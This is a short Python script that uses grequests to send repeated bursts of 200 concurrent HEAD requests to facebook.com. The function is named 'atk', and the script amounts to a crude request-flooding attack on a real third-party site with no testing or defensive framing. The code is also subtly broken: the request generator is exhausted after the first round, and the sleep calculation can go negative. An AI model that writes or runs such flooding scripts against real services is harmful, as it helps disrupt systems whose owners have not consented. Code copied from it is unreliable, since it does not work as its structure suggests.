import grequests
import time

def atk(url, req, times):
    urls = [url]*req
    rs = (grequests.head(u) for u in urls)

    for i in range(0, times):
        start_time = time.time()
        print(start_time)
        grequests.map(rs)
        sleep_time = time.time() - start_time
        time.sleep(1 - sleep_time - 0.1)

start_time = time.time()
url = "https://facebook.com/"
atk(url, 200, 20)
print(time.time() - start_time)